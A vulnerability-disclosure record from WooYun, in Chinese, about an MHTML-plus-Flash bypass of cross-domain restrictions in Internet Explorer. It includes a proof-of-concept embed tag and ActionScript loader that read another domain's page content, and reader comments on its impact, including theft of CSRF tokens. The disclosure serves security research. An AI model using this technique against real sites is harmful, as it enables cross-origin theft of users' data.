{"id": 23052, "wybug_id": "wooyun-2011-01929", "wybug_title": "微软补丁后的MHTML“跨域”漏洞可以利用", "wybug_corp": "微软", "wybug_author": "latentwind", "wybug_date": "2011-04-18 22:36", "wybug_open_date": "2011-04-18 22:46", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["防护策略绕过", "应用安全", "跨域", "利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-04-18：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2011-04-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 利用第三方插件如flash，仍然可以跨域读数据。个人认为主因还是在于微软，微软mhtml补丁不给力？ 详细说明：  假设攻击者可控的网站为evildomain.com，用户存储数据的网站为trusteddomain.com。http://evildomain.com/flash.html，其HTML代码如下：\n<embed type=\"application/x-shockwave-flash\" src=\"mhtml:http://trusteddomain.com/wooyun.jpg!wooyun.swf\" allowNetworking=all AllowScriptAccess=samedomain width=500 height=500></embed>\n攻击者可控的wooyun.jpg里附加了flash，其as代码大致如下：var url:String =\"http://trusteddomain.com/flash.html\";if(url!=null){\tmainText.border = true;\tvar loader = new URLLoader();\tvar req = new URLRequest(url);\tloader.dataFormat = URLLoaderDataFormat.BINARY; \tloader.addEventListener(Event.COMPLETE,getContent);\tloader.load(req);\tfunction getContent(event:Event):void\t{\t\tvar bt:ByteArray = loader.data;\t\tvar restext:String = bt.readMultiByte(bt.length,\"gb2312\"); \t\tmainText.text = restext;\t}}PS:这里为了测试方面，trusteddomain.com和evildomain.com指向同一个网站   漏洞证明：  访问后效果如下：\n\n可见我们可控的flash，读取了http://trusteddomain.com/flash.html的内容。同样的，攻击者也可以利用该漏洞“绕过”samedomain的限制，就不再列出。相关请参考http://hi.baidu.com/d4rkwind/blog/item/e01bb6edbeef2320adafd5d2.html   修复方案：  。。。   版权声明：转载请注明来源 latentwind@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2011-09-24 22:46 |    \t\t白细胞 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:6        )\t\t \n  这么好的思路，竟然没人顶。    \n     2012-03-23 10:38 |    \t\tg.r0b1n \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | FreeBufer)\t\t \n  这让我想起Google的那个xss，的确！想象力很关键 :)    \n     2012-04-06 10:07 |    \t\ttpu01yzx \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:8        | test)\t\t \n  这个也算漏洞?没看出来，跟直接<iframe>添加一个外部网站的页面有什么本质的区别吗？求解释。    \n     2012-04-06 10:08 |    \t\ttpu01yzx \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:8        | test)\t\t \n  好吧，我后知后觉了。    \n     2012-04-13 01:56 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  白天来了解-下子。很不错。    \n     2012-07-19 15:34 |    \t\tzhq445078388 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:19        | 请牢记\"杀进程点康姆\")\t\t \n  @tpu01yzx FLASH的话 可能导致论坛等地方允许用户上传flash的地方而iframe插框架 至少也得获取一个js的权限 难度较大    \n     2012-08-11 08:15 |    \t\t大和尚 \t\t\t( 实习白帽子  |\t\t\t        Rank:49 漏洞数:5        | www.ieroot.com 积极向上的心态！百折不挠...)\t\t \n  没有联系到厂商或者积极拒绝是不是意味着，这漏洞还存在着...    \n     2012-08-11 12:03 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @tpu01yzx 区别在于，这个可以跨域获取目标域的网页内容，而网页内容里可能有一些有用的信息（比如一些防csrf的token信息），  而iframe只能嵌入目标域的网页，但是无法获取网页的源码内容。    \n     2013-05-07 19:33 |    \t\t爱梅小礼 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:16        | 我怀念的是无话不说)\t\t \n  这个一定要顶，MS你有本事永远别补    \n     2013-07-23 20:55 |    \t\t╰╃清風 \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:9        | 这家伙很懒，什么都没有留下)\t\t \n  好东西    \n     2013-07-24 11:04 |    \t\t爱梅小礼 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:16        | 我怀念的是无话不说)\t\t \n  @╰╃清風 鸡肋而已    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}